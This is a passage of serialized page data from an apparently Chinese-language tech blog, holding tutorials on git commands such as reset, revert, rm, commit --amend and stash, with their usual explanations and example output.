1\n\n最后，使用git cherry-pick命令转移提交。\n\n>  $ git cherry-pick <commithash> \n> \n> \n> 1",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"git reset --hard --soft 与 git revert 的作用",frontmatter:{title:"git reset --hard --soft 与 git revert 的作用",date:"2022-04-25T00:48:54.000Z",permalink:"/pages/f40b57/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/06.git%20reset%20--hard%20--soft%20%E4%B8%8E%20git%20revert%20%E7%9A%84%E4%BD%9C%E7%94%A8.html",relativePath:"08.软件使用/04.git/06.git reset --hard --soft 与 git revert 的作用.md",key:"v-9db3ab1e",path:"/pages/f40b57/",headers:[{level:2,title:"git reset --hard --soft 与 git revert 的作用：",slug:"git-reset-hard-soft-与-git-revert-的作用",normalizedTitle:"git reset --hard --soft 与 git revert 的作用：",charIndex:2},{level:2,title:"git简单的分为三个区域 ：",slug:"git简单的分为三个区域",normalizedTitle:"git简单的分为三个区域 ：",charIndex:79},{level:2,title:"git reset --hard xxx",slug:"git-reset-hard-xxx",normalizedTitle:"git reset --hard xxx",charIndex:173},{level:2,title:"git reset --soft xxx",slug:"git-reset-soft-xxx",normalizedTitle:"git reset --soft xxx",charIndex:467},{level:2,title:"git revert xxx",slug:"git-revert-xxx",normalizedTitle:"git revert xxx",charIndex:617},{level:2,title:"git revert和git reset的区别",slug:"git-revert和git-reset的区别",normalizedTitle:"git revert和git reset的区别",charIndex:761}],headersStr:"git reset --hard --soft 与 git revert 的作用： git简单的分为三个区域 ： git reset --hard xxx git reset --soft xxx git revert xxx git revert和git reset的区别",content:"# git reset --hard --soft 与 git revert 的作用：\n\n * 1. 文件从暂存区回退到工作区\n * 2. 版本回退\n\n\n# git简单的分为三个区域 ：\n\n * 1、工作区（working directory）\n\n * 2、暂缓区（stage index）\n\n * 3、历史记录区（history）\n\n\n\n\n# git reset --hard xxx\n\n * hard （修改版本库，修改暂存区，修改工作区）\n\n--hard HEAD～1 (或是版本号)意为将版本库回退1个版本，但是不仅仅是将本地版本库的头指针全部重置到指定版本，也会重置暂存区，并且会将工作区代码也回退到这个版本\n\n\n\nhard-修改版本库.png\n\n * HEAD 就是当前活跃分支的游标。形象的记忆就是：你现在在哪儿，HEAD 就指向哪儿，所以 Git 才知道你在那儿！ 不过 HEAD 并非只能指向分支的最顶端（时间节点距今最近的那个），实际上它可以指向任何一个节点，它就是 Git 内部用来追踪当前位置的东东。\n\n\n# git reset --soft xxx\n\n * soft （修改版本库，保留暂存区，保留工作区）\n\n--soft HEAD～1 意为将版本库软回退1个版本，所谓软回退表示将本地版本库的头指针全部重置到指定版本，且将这次提交之后的所有变更都移动到暂存区。\n\n\n\nsoft-修改版本库.png\n\n\n# git revert xxx\n\n * revert -- git revert 也是撤销命令，区别在于reset是指向原地或者向前移动指针，git revert是创建一个commit来覆盖当前的commit，指针向后移动。\n   \n   \n   \n   revert回滚.png\n\n\n# git revert和git reset的区别\n\ngit revert与git reset最大的不同是，git revert 仅仅是撤销某次提交，而git reset会将撤销点之后的操作都回退到暂存区中。\n\n1、git revert是用一次新的commit来回滚之前的commit，git reset是直接删除指定的commit。\n\n2、在回滚这一操作上看，效果差不多。但是在日后继续merge以前的老版本时有区别。\n\n因为git revert是用一次逆向的commit“中和”之前的提交，因此日后合并老的branch时，导致这部分改变不会再次出现，但是git reset是之间把某些commit在某个branch上删除，因而和老的branch再次merge时，这些被回滚的commit应该还会被引入。\n\n3、git reset 是把HEAD向后移动了一下，而git revert是HEAD继续前进，只是新的commit的内容和要revert的内容正好相反，能够抵消要被revert的内容。\n\n附：不得不提的git的其它删除命令（类似于Linux的命令）：\n\n * git rm --cached readme.txt 只从缓存区中删除readme.txt，保留物理文件\n * git rm readme.txt 不但从缓存区中删除，同时删除物理文件\n * git mv a.txt b.txt 把a.txt改名为b.txt",normalizedContent:"# git reset --hard --soft 与 git revert 的作用：\n\n * 1. 文件从暂存区回退到工作区\n * 2. 版本回退\n\n\n# git简单的分为三个区域 ：\n\n * 1、工作区（working directory）\n\n * 2、暂缓区（stage index）\n\n * 3、历史记录区（history）\n\n\n\n\n# git reset --hard xxx\n\n * hard （修改版本库，修改暂存区，修改工作区）\n\n--hard head～1 (或是版本号)意为将版本库回退1个版本，但是不仅仅是将本地版本库的头指针全部重置到指定版本，也会重置暂存区，并且会将工作区代码也回退到这个版本\n\n\n\nhard-修改版本库.png\n\n * head 就是当前活跃分支的游标。形象的记忆就是：你现在在哪儿，head 就指向哪儿，所以 git 才知道你在那儿！ 不过 head 并非只能指向分支的最顶端（时间节点距今最近的那个），实际上它可以指向任何一个节点，它就是 git 内部用来追踪当前位置的东东。\n\n\n# git reset --soft xxx\n\n * soft （修改版本库，保留暂存区，保留工作区）\n\n--soft head～1 意为将版本库软回退1个版本，所谓软回退表示将本地版本库的头指针全部重置到指定版本，且将这次提交之后的所有变更都移动到暂存区。\n\n\n\nsoft-修改版本库.png\n\n\n# git revert xxx\n\n * revert -- git revert 也是撤销命令，区别在于reset是指向原地或者向前移动指针，git revert是创建一个commit来覆盖当前的commit，指针向后移动。\n   \n   \n   \n   revert回滚.png\n\n\n# git revert和git reset的区别\n\ngit revert与git reset最大的不同是，git revert 仅仅是撤销某次提交，而git reset会将撤销点之后的操作都回退到暂存区中。\n\n1、git revert是用一次新的commit来回滚之前的commit，git reset是直接删除指定的commit。\n\n2、在回滚这一操作上看，效果差不多。但是在日后继续merge以前的老版本时有区别。\n\n因为git revert是用一次逆向的commit“中和”之前的提交，因此日后合并老的branch时，导致这部分改变不会再次出现，但是git reset是之间把某些commit在某个branch上删除，因而和老的branch再次merge时，这些被回滚的commit应该还会被引入。\n\n3、git reset 是把head向后移动了一下，而git revert是head继续前进，只是新的commit的内容和要revert的内容正好相反，能够抵消要被revert的内容。\n\n附：不得不提的git的其它删除命令（类似于linux的命令）：\n\n * git rm --cached readme.txt 只从缓存区中删除readme.txt，保留物理文件\n * git rm readme.txt 不但从缓存区中删除，同时删除物理文件\n * git mv a.txt b.txt 把a.txt改名为b.txt",charsets:{cjk:!0},lastUpdated:"2022/04/26, 23:46:36",lastUpdatedTimestamp:1650987996e3},{title:"git 回滚 reset、revert",frontmatter:{title:"git 回滚 reset、revert",date:"2022-04-26T23:45:37.000Z",permalink:"/pages/7dff3d/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/05.git%20%E5%9B%9E%E6%BB%9A%20reset%E3%80%81revert.html",relativePath:"08.软件使用/04.git/05.git 回滚 reset、revert.md",key:"v-93497fbc",path:"/pages/7dff3d/",headers:[{level:2,title:"一、问题描述",slug:"一、问题描述",normalizedTitle:"一、问题描述",charIndex:27},{level:2,title:"二、背景知识",slug:"二、背景知识",normalizedTitle:"二、背景知识",charIndex:141},{level:2,title:"三、解决方法",slug:"三、解决方法",normalizedTitle:"三、解决方法",charIndex:377},{level:3,title:"方法一：git reset",slug:"方法一-git-reset",normalizedTitle:"方法一：git reset",charIndex:388},{level:4,title:"reset 各种模式",slug:"reset-各种模式",normalizedTitle:"reset 各种模式",charIndex:839},{level:5,title:"soft",slug:"soft",normalizedTitle:"soft",charIndex:853},{level:5,title:"mixed",slug:"mixed",normalizedTitle:"mixed",charIndex:915},{level:5,title:"hard",slug:"hard",normalizedTitle:"hard",charIndex:612},{level:5,title:"keep",slug:"keep",normalizedTitle:"keep",charIndex:1065},{level:4,title:"idea 操作",slug:"idea-操作",normalizedTitle:"idea 操作",charIndex:1167},{level:3,title:"方法二：git revert",slug:"方法二-git-revert",normalizedTitle:"方法二：git revert",charIndex:1250},{level:4,title:"idea 操作",slug:"idea-操作-2",normalizedTitle:"idea 操作",charIndex:1167},{level:4,title:"管理端操作",slug:"管理端操作",normalizedTitle:"管理端操作",charIndex:2486},{level:2,title:"四、选择 reset 还是 revert",slug:"四、选择-reset-还是-revert",normalizedTitle:"四、选择 reset 还是 revert",charIndex:2525}],headersStr:"一、问题描述 二、背景知识 三、解决方法 方法一：git reset reset 各种模式 soft mixed hard keep idea 操作 方法二：git revert idea 操作 管理端操作 四、选择 reset 还是 revert",content:'> 本文原文地址 blog.csdn.net\n\n\n# 一、问题描述\n\n> 在利用github 实现多人合作程序开发的过程中，我们有时会出现错误提交的情况，此时我们希望能撤销提交操作，让程序回到提交前的样子，本文总结了两种解决方法：回退（reset）、反做（revert）。\n\n\n# 二、背景知识\n\n> git 的版本管理，及 HEAD 的理解\n> 使用 git 的每次提交，Git 都会自动把它们串成一条时间线，这条时间线就是一个分支。如果没有新建分支，那么只有一条时间线，即只有一个分支，在 Git 里，这个分支叫主分支，即 master 分支。有一个 HEAD 指针指向当前分支（只有一个分支的情况下会指向 master，而 master 是指向最新提交）。每个版本都会有自己的版本信息，如特有的版本号、版本名等。如下图，假设只有一个分支：\n\n\n# 三、解决方法\n\n\n# 方法一：git reset\n\n原理： git reset 的作用是修改 HEAD 的位置，即将 HEAD 指向的位置改变为之前存在的某个版本，如下图所示，假设我们要回退到版本一：\n\n\n适用场景： 如果想恢复到之前某个提交的版本，且那个版本之后提交的版本我们都不要了，就可以用这种方法。\n\n具体操作：\n\n1. 查看版本号：\n可以使用命令 “git log” 查看：\n\n\n也可以在 github 网站上查看：\n\n\n2. 使用 “git reset --hard 目标版本号” 命令将版本回退：\n\n\n再用 “git log” 查看版本信息，此时本地的 HEAD 已经指向之前的版本：\n\n\n3. 使用 “git push -f” 提交更改：\n此时如果用 “git push” 会报错，因为我们本地库 HEAD 指向的版本比远程库的要旧：\n\n\n所以我们要用 “git push -f” 强制推上去，就可以了：\n\n在 github 图形化界面上看，远程库的 HEAD 也已经指向目标版本：\n\n\n\n回退成功！\n\n# reset 各种模式\n\n# soft\n\n * 移动本地库 HEAD 指针\n * 重置暂存区\n * 重置工作区\n\n> 归滚后不要被回滚的代码就选择\n\n# mixed\n\n * 移动本地库 HEAD 指针\n\n> 归滚后要被回滚的代码，被回滚的代码在暂存区，当然也可以在工作区修改被回滚的代码\n\n# hard\n\n * 移动本地库 HEAD 指针\n\n * 重置暂存区\n\n> 归滚后要被回滚的代码，被回滚的代码不在暂存区，当然也可以在工作区修改被回滚的代码\n\n# keep\n\n * 移动本地库 HEAD 指针\n\n * 暂存区不变\n\n * 重置工作区\n\n> 归滚后要被回滚的代码，被回滚的代码在暂存区，因为要重置工作区，所以暂存区和工作区会存在冲突（要解决冲突）\n\n# idea 操作\n\n1、选择要回滚到哪个版本（被选中的版本不会被回滚）\n\n\n2、选择回滚的模式\n\n\n也可以选择版本号进行回滚（注意：被选中的版本号不会被回滚）\n\n\n# 方法二：git revert\n\n----------------------------------------\n\n> 原理： git revert 是用于 “反做” 某一个版本，以达到撤销该版本的修改的目的。比如，我们 commit 了三个版本（版本一、版本二、 版本三），突然发现版本二不行（如：有 bug），想要撤销版本二，但又不想影响撤销版本三的提交，就可以用 git revert 命令来反做版本二，生成新的版本四，这个版本四里会保留版本三的东西，但撤销了版本二的东西。如下图所示：\n\n\n\n适用场景： 如果我们想撤销之前的某一版本，但是又想保留该目标版本后面的版本，记录下这整个版本变动流程，就可以用这种方法。\n\n具体操作：\n\n举个例子，现在库里面有三个文件：READ.md、text.txt、text2.txt。\n\n\n 1. 查看版本号：\n    可以通过命令行查看（输入 git log）：\n    如图，最近的两个版本分别叫：“add text.txt”（即新增了文件 text.txt）、“add text2.txt”（新增了文件 text2.txt）。这个时候我们不需要 text.txt 这个文件了，那就是说不想要 “add text.txt” 那个版本的操作，那可以通过反做 “add text.txt” 这个版本来实现。\n    \n\n也可以通过 github 网站图形化界面查看版本号：\n\n\n2. 使用 “git revert -n 版本号” 反做，并使用 “git commit -m 版本名” 提交：\n（1）反做，使用 “git revert -n 版本号” 命令。如下命令，我们反做版本号为 8b89621 的版本：\n\ngit revert -n 8b89621019c9adc6fc4d242cd41daeb13aeb9861\n\n\n\n1\n2\n\n\n注意： 这里可能会出现冲突，那么需要手动修改冲突的文件。而且要 git add 文件名。\n（2）提交，使用 “git commit -m 版本名”，如：\n\ngit commit -m "revert add text.txt" \n\n\n\n1\n2\n\n\n此时可以用 “git log” 查看本地的版本信息，可见多生成了一个新的版本，该版本反做了 “add text.txt” 版本，但是保留了 “add text2.txt” 版本：\n\n\n3. 使用 “git push” 推上远程库：\n\ngit push\n\n\n\n1\n2\n\n\n查看 github 上显示的远程库版本信息：\n\n\n此时查看仓库的文件，剩下两个：READ.md、text2.txt\n\n\n反做成功！\n\n冲突\n\nrevert 如果之前和之后版本有改到同一个地方也会触发冲突（需要手动解决冲突）\n\n# idea 操作\n\n选择要 revert 的版本进行 revert（是 revert 选中的本版）\n\n\n也可以复制版本号进行 revert\n\n# 管理端操作\n\n在浏览器选择要回滚的版本进行回滚（示例 gitlab\n\n\n\n# 四、选择 reset 还是 revert\n\n1、上面讲这两种方案都讲了使用场景\n\n2、说下选择 revert 我遇到的坑\n\n比如某个需求开发完成后（A 分支）需要合并到主分支，却不小心把 B 分支合到主分支，B 分支还在开发中未能达到合并的要求，这种场景正常情况直接 reset 掉就行，假如选择了 revert 也可以达到目的，但是后面 B 开发完成需要合并主分支后，发现主分支合不上，原因是之前已经有个 revert 的记录，遇到这种情况只需要把之前的 revert 记录再 revert 一次就行（不推荐这种操作行为）。所以正确的选择回滚的方式可以避免不必要的麻烦。\n\n转载文章：https://blog.csdn.net/yxlshk/article/details/79944535，感谢原著的贡献，本文补充了缺失的内容和优化一些细节。',normalizedContent:'> 本文原文地址 blog.csdn.net\n\n\n# 一、问题描述\n\n> 在利用github 实现多人合作程序开发的过程中，我们有时会出现错误提交的情况，此时我们希望能撤销提交操作，让程序回到提交前的样子，本文总结了两种解决方法：回退（reset）、反做（revert）。\n\n\n# 二、背景知识\n\n> git 的版本管理，及 head 的理解\n> 使用 git 的每次提交，git 都会自动把它们串成一条时间线，这条时间线就是一个分支。如果没有新建分支，那么只有一条时间线，即只有一个分支，在 git 里，这个分支叫主分支，即 master 分支。有一个 head 指针指向当前分支（只有一个分支的情况下会指向 master，而 master 是指向最新提交）。每个版本都会有自己的版本信息，如特有的版本号、版本名等。如下图，假设只有一个分支：\n\n\n# 三、解决方法\n\n\n# 方法一：git reset\n\n原理： git reset 的作用是修改 head 的位置，即将 head 指向的位置改变为之前存在的某个版本，如下图所示，假设我们要回退到版本一：\n\n\n适用场景： 如果想恢复到之前某个提交的版本，且那个版本之后提交的版本我们都不要了，就可以用这种方法。\n\n具体操作：\n\n1. 查看版本号：\n可以使用命令 “git log” 查看：\n\n\n也可以在 github 网站上查看：\n\n\n2. 使用 “git reset --hard 目标版本号” 命令将版本回退：\n\n\n再用 “git log” 查看版本信息，此时本地的 head 已经指向之前的版本：\n\n\n3. 使用 “git push -f” 提交更改：\n此时如果用 “git push” 会报错，因为我们本地库 head 指向的版本比远程库的要旧：\n\n\n所以我们要用 “git push -f” 强制推上去，就可以了：\n\n在 github 图形化界面上看，远程库的 head 也已经指向目标版本：\n\n\n\n回退成功！\n\n# reset 各种模式\n\n# soft\n\n * 移动本地库 head 指针\n * 重置暂存区\n * 重置工作区\n\n> 归滚后不要被回滚的代码就选择\n\n# mixed\n\n * 移动本地库 head 指针\n\n> 归滚后要被回滚的代码，被回滚的代码在暂存区，当然也可以在工作区修改被回滚的代码\n\n# hard\n\n * 移动本地库 head 指针\n\n * 重置暂存区\n\n> 归滚后要被回滚的代码，被回滚的代码不在暂存区，当然也可以在工作区修改被回滚的代码\n\n# keep\n\n * 移动本地库 head 指针\n\n * 暂存区不变\n\n * 重置工作区\n\n> 归滚后要被回滚的代码，被回滚的代码在暂存区，因为要重置工作区，所以暂存区和工作区会存在冲突（要解决冲突）\n\n# idea 操作\n\n1、选择要回滚到哪个版本（被选中的版本不会被回滚）\n\n\n2、选择回滚的模式\n\n\n也可以选择版本号进行回滚（注意：被选中的版本号不会被回滚）\n\n\n# 方法二：git revert\n\n----------------------------------------\n\n> 原理： git revert 是用于 “反做” 某一个版本，以达到撤销该版本的修改的目的。比如，我们 commit 了三个版本（版本一、版本二、 版本三），突然发现版本二不行（如：有 bug），想要撤销版本二，但又不想影响撤销版本三的提交，就可以用 git revert 命令来反做版本二，生成新的版本四，这个版本四里会保留版本三的东西，但撤销了版本二的东西。如下图所示：\n\n\n\n适用场景： 如果我们想撤销之前的某一版本，但是又想保留该目标版本后面的版本，记录下这整个版本变动流程，就可以用这种方法。\n\n具体操作：\n\n举个例子，现在库里面有三个文件：read.md、text.txt、text2.txt。\n\n\n 1. 查看版本号：\n    可以通过命令行查看（输入 git log）：\n    如图，最近的两个版本分别叫：“add text.txt”（即新增了文件 text.txt）、“add text2.txt”（新增了文件 text2.txt）。这个时候我们不需要 text.txt 这个文件了，那就是说不想要 “add text.txt” 那个版本的操作，那可以通过反做 “add text.txt” 这个版本来实现。\n    \n\n也可以通过 github 网站图形化界面查看版本号：\n\n\n2. 使用 “git revert -n 版本号” 反做，并使用 “git commit -m 版本名” 提交：\n（1）反做，使用 “git revert -n 版本号” 命令。如下命令，我们反做版本号为 8b89621 的版本：\n\ngit revert -n 8b89621019c9adc6fc4d242cd41daeb13aeb9861\n\n\n\n1\n2\n\n\n注意： 这里可能会出现冲突，那么需要手动修改冲突的文件。而且要 git add 文件名。\n（2）提交，使用 “git commit -m 版本名”，如：\n\ngit commit -m "revert add text.txt" \n\n\n\n1\n2\n\n\n此时可以用 “git log” 查看本地的版本信息，可见多生成了一个新的版本，该版本反做了 “add text.txt” 版本，但是保留了 “add text2.txt” 版本：\n\n\n3. 使用 “git push” 推上远程库：\n\ngit push\n\n\n\n1\n2\n\n\n查看 github 上显示的远程库版本信息：\n\n\n此时查看仓库的文件，剩下两个：read.md、text2.txt\n\n\n反做成功！\n\n冲突\n\nrevert 如果之前和之后版本有改到同一个地方也会触发冲突（需要手动解决冲突）\n\n# idea 操作\n\n选择要 revert 的版本进行 revert（是 revert 选中的本版）\n\n\n也可以复制版本号进行 revert\n\n# 管理端操作\n\n在浏览器选择要回滚的版本进行回滚（示例 gitlab\n\n\n\n# 四、选择 reset 还是 revert\n\n1、上面讲这两种方案都讲了使用场景\n\n2、说下选择 revert 我遇到的坑\n\n比如某个需求开发完成后（a 分支）需要合并到主分支，却不小心把 b 分支合到主分支，b 分支还在开发中未能达到合并的要求，这种场景正常情况直接 reset 掉就行，假如选择了 revert 也可以达到目的，但是后面 b 开发完成需要合并主分支后，发现主分支合不上，原因是之前已经有个 revert 的记录，遇到这种情况只需要把之前的 revert 记录再 revert 一次就行（不推荐这种操作行为）。所以正确的选择回滚的方式可以避免不必要的麻烦。\n\n转载文章：https://blog.csdn.net/yxlshk/article/details/79944535，感谢原著的贡献，本文补充了缺失的内容和优化一些细节。',charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"git rm 命令",frontmatter:{title:"git rm 命令",date:"2022-04-25T00:48:54.000Z",permalink:"/pages/a756b7/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/07.git%20rm%20%E5%91%BD%E4%BB%A4.html",relativePath:"08.软件使用/04.git/07.git rm 命令.md",key:"v-f744492c",path:"/pages/a756b7/",headers:[{level:3,title:"实例",slug:"实例",normalizedTitle:"实例",charIndex:155}],headersStr:"实例",content:"git rm 命令用于删除文件。\n\n如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。\n\ngit rm 删除文件有以下几种形式：\n\n1、将文件从暂存区和工作区中删除：\n\ngit rm <file>\n\n\n1\n\n\n以下实例从暂存区和工作区中删除 runoob.txt 文件：\n\ngit rm runoob.txt \n\n\n1\n\n\n如果删除之前修改过并且已经放到暂存区域的话，则必须要用强制删除选项 -f。\n\n强行从暂存区和工作区中删除修改后的 runoob.txt 文件：\n\ngit rm -f runoob.txt\n\n\n1\n\n\n如果想把文件从暂存区域移除，但仍然希望保留在当前工作目录中，换句话说，仅是从跟踪清单中删除，使用 --cached 选项即可：\n\ngit rm --cached <file>\n\n\n1\n\n\n以下实例从暂存区中删除 runoob.txt 文件：\n\ngit rm --cached runoob.txt\n\n\n1\n\n\n\n# 实例\n\n删除 hello.php 文件：\n\n$ git rm hello.php \nrm 'hello.php' \n$ ls\nREADME\n\n\n1\n2\n3\n4\n\n\n文件从暂存区域移除，但工作区保留：\n\n$ git rm --cached README \nrm 'README'\n$ ls\nREADME\n\n\n1\n2\n3\n4\n\n\n可以递归删除，即如果后面跟的是一个目录做为参数，则会递归删除整个目录中的所有子目录和文件：\n\ngit rm –r *  \n\n\n1\n\n\n进入某个目录中，执行此语句，会删除该目录下的所有文件和子目录。",normalizedContent:"git rm 命令用于删除文件。\n\n如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 changes not staged for commit 的提示。\n\ngit rm 删除文件有以下几种形式：\n\n1、将文件从暂存区和工作区中删除：\n\ngit rm <file>\n\n\n1\n\n\n以下实例从暂存区和工作区中删除 runoob.txt 文件：\n\ngit rm runoob.txt \n\n\n1\n\n\n如果删除之前修改过并且已经放到暂存区域的话，则必须要用强制删除选项 -f。\n\n强行从暂存区和工作区中删除修改后的 runoob.txt 文件：\n\ngit rm -f runoob.txt\n\n\n1\n\n\n如果想把文件从暂存区域移除，但仍然希望保留在当前工作目录中，换句话说，仅是从跟踪清单中删除，使用 --cached 选项即可：\n\ngit rm --cached <file>\n\n\n1\n\n\n以下实例从暂存区中删除 runoob.txt 文件：\n\ngit rm --cached runoob.txt\n\n\n1\n\n\n\n# 实例\n\n删除 hello.php 文件：\n\n$ git rm hello.php \nrm 'hello.php' \n$ ls\nreadme\n\n\n1\n2\n3\n4\n\n\n文件从暂存区域移除，但工作区保留：\n\n$ git rm --cached readme \nrm 'readme'\n$ ls\nreadme\n\n\n1\n2\n3\n4\n\n\n可以递归删除，即如果后面跟的是一个目录做为参数，则会递归删除整个目录中的所有子目录和文件：\n\ngit rm –r *  \n\n\n1\n\n\n进入某个目录中，执行此语句，会删除该目录下的所有文件和子目录。",charsets:{cjk:!0},lastUpdated:"2022/04/26, 23:46:36",lastUpdatedTimestamp:1650987996e3},{title:"git commit --amend 修改 git 提交记录用法详解",frontmatter:{title:"git commit --amend 修改 git 提交记录用法详解",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/ae252b/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/08.git%20commit%20--amend%20%E4%BF%AE%E6%94%B9%20git%20%E6%8F%90%E4%BA%A4%E8%AE%B0%E5%BD%95%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3.html",relativePath:"08.软件使用/04.git/08.git commit --amend 修改 git 提交记录用法详解.md",key:"v-1c33a56a",path:"/pages/ae252b/",headersStr:null,content:"> 本文原文地址 https://zhuanlan.zhihu.com/p/100243017\n\n有时你提交过代码之后，发现一个地方改错了，你下次提交时不想保留上一次的记录；或者你上一次的 commit message 的描述有误，这时候你可以使用接下来的这个命令：git commit --amend。\n\ngit 功能十分强大，接下来我将讲解一下 git commit --amend 命令的用法~\n\ngit log 之后，可以看到你之前提交过的 git 历史：\n\n\n\n接下来，在 bash 里输入 wq 退出 log 状态，执行：\n\n$ git commit --amend\n\n\n1\n\n\n这时 bash 里会出现以下内容：\n\n\n\n其中，second commit 是你上次提交的描述，下面是一下说明信息，有告诉你上次提交的文件信息等等，可忽略。接下来你要是想修改描述信息的话。直接键入：i，此时进入了输入模式，变成这样子：\n\n\n\n可用键盘上下键转到描述所在的那一行，然后进行修改：\n\n\n\n修改完成后，按下 Esc 键退出编辑模式，在键入 :wq 回车退出并保存修改，完成提交。这是你再 git log 看一下提交日志：\n\n\n\n已经修改了提交描述信息，且原来的 git 版本没有了 但是有个地方要注意，就是该操作会改变你原来的 commit id 哦。",normalizedContent:"> 本文原文地址 https://zhuanlan.zhihu.com/p/100243017\n\n有时你提交过代码之后，发现一个地方改错了，你下次提交时不想保留上一次的记录；或者你上一次的 commit message 的描述有误，这时候你可以使用接下来的这个命令：git commit --amend。\n\ngit 功能十分强大，接下来我将讲解一下 git commit --amend 命令的用法~\n\ngit log 之后，可以看到你之前提交过的 git 历史：\n\n\n\n接下来，在 bash 里输入 wq 退出 log 状态，执行：\n\n$ git commit --amend\n\n\n1\n\n\n这时 bash 里会出现以下内容：\n\n\n\n其中，second commit 是你上次提交的描述，下面是一下说明信息，有告诉你上次提交的文件信息等等，可忽略。接下来你要是想修改描述信息的话。直接键入：i，此时进入了输入模式，变成这样子：\n\n\n\n可用键盘上下键转到描述所在的那一行，然后进行修改：\n\n\n\n修改完成后，按下 esc 键退出编辑模式，在键入 :wq 回车退出并保存修改，完成提交。这是你再 git log 看一下提交日志：\n\n\n\n已经修改了提交描述信息，且原来的 git 版本没有了 但是有个地方要注意，就是该操作会改变你原来的 commit id 哦。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"git stash 详解",frontmatter:{title:"git stash 详解",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/d6c0e8/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/09.git%20stash%20%E8%AF%A6%E8%A7%A3.html",relativePath:"08.软件使用/04.git/09.git stash 详解.md",key:"v-bc3f9e88",path:"/pages/d6c0e8/",headers:[{level:2,title:"应用场景：",slug:"应用场景",normalizedTitle:"应用场景：",charIndex:69},{level:2,title:"命令详解：",slug:"命令详解",normalizedTitle:"命令详解：",charIndex:510},{level:3,title:"1 git stash",slug:"_1-git-stash",normalizedTitle:"1 git stash",charIndex:520},{level:3,title:"2 git stash save",slug:"_2-git-stash-save",normalizedTitle:"2 git stash save",charIndex:1155},{level:3,title:"3 git stash list",slug:"_3-git-stash-list",normalizedTitle:"3 git stash list",charIndex:1333},{level:3,title:"4 git stash pop",slug:"_4-git-stash-pop",normalizedTitle:"4 git stash pop",charIndex:1371},{level:3,title:"5 git stash apply",slug:"_5-git-stash-apply",normalizedTitle:"5 git stash apply",charIndex:2193},{level:3,title:"6 git stash drop + 名称",slug:"_6-git-stash-drop-名称",normalizedTitle:"6 git stash drop + 名称",charIndex:2818},{level:3,title:"7 git stash clear",slug:"_7-git-stash-clear",normalizedTitle:"7 git stash clear",charIndex:2863},{level:3,title:"8 git stash show",slug:"_8-git-stash-show",normalizedTitle:"8 git stash show",charIndex:2898},{level:3,title:"9 git stash branch",slug:"_9-git-stash-branch",normalizedTitle:"9 git stash branch",charIndex:4277}],headersStr:"应用场景： 命令详解： 1 git stash 2 git stash save 3 git stash list 4 git stash pop 5 git stash apply 6 git stash drop + 名称 7 git stash clear 8 git stash show 9 git stash branch",content:'> 本文原文地址 https://blog.csdn.net/stone_yw/article/details/80795669\n\n\n# 应用场景：\n\n1 当正在 dev 分支上开发某个项目，这时项目中出现一个 bug，需要紧急修复，但是正在开发的内容只是完成一半，还不想提交，这时可以用 git stash 命令将修改的内容保存至堆栈区，然后顺利切换到 hotfix 分支进行 bug 修复，修复完成后，再次切回到 dev 分支，从堆栈中恢复刚刚保存的内容。\n2 由于疏忽，本应该在 dev 分支开发的内容，却在 master 上进行了开发，需要重新切回到 dev 分支上进行开发，可以用 git stash 将内容保存至堆栈中，切回到 dev 分支后，再次恢复内容即可。\n总的来说，git stash 命令的作用就是将目前还不想提交的但是已经修改的内容进行保存至堆栈中，后续可以在某个分支上恢复出堆栈中的内容。这也就是说，stash 中的内容不仅仅可以恢复到原先开发的分支，也可以恢复到其他任意指定的分支上。git stash 作用的范围包括工作区和暂存区中的内容，也就是说没有提交的内容都会保存至堆栈中。\n\n\n# 命令详解：\n\n\n# 1 git stash\n\n能够将所有未提交的修改（工作区和暂存区）保存至堆栈中，用于后续恢复当前工作目录。\n\n$ git status\nOn branch master\nChanges not staged for commit:\n  (use "git add <file>..." to update what will be committed)\n  (use "git checkout -- <file>..." to discard changes in working directory)\n\n        modified:   src/main/java/com/wy/CacheTest.java\n        modified:   src/main/java/com/wy/StringTest.java\n\nno changes added to commit (use "git add" and/or "git commit -a")\n\n$ git stash\nSaved working directory and index state WIP on master: b2f489c second\n\n$ git status\nOn branch master\nnothing to commit, working tree clean\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 2 git stash save\n\n作用等同于 git stash，区别是可以加一些注释，如下：\ngit stash 的效果：\n\nstash@{0}: WIP on master: b2f489c second\n\n\n1\n\n\ngit stash save “test1” 的效果：\n\nstash@{0}: On master: test1\n\n\n1\n\n\n\n# 3 git stash list\n\n查看当前 stash 中的内容\n\n\n# 4 git stash pop\n\n将当前 stash 中的内容弹出，并应用到当前分支对应的工作目录上。\n注：该命令将堆栈中最近保存的内容删除（栈是先进后出）\n顺序执行 git stash save “test1” 和 git stash save “test2” 命令，效果如下：\n\n$ git stash list\nstash@{0}: On master: test2\nstash@{1}: On master: test1\n\n$ git stash pop\nOn branch master\nChanges not staged for commit:\n  (use "git add <file>..." to update what will be committed)\n  (use "git checkout -- <file>..." to discard changes in working directory)\n\n        modified:   src/main/java/com/wy/StringTest.java\n\nno changes added to commit (use "git add" and/or "git commit -a")\nDropped 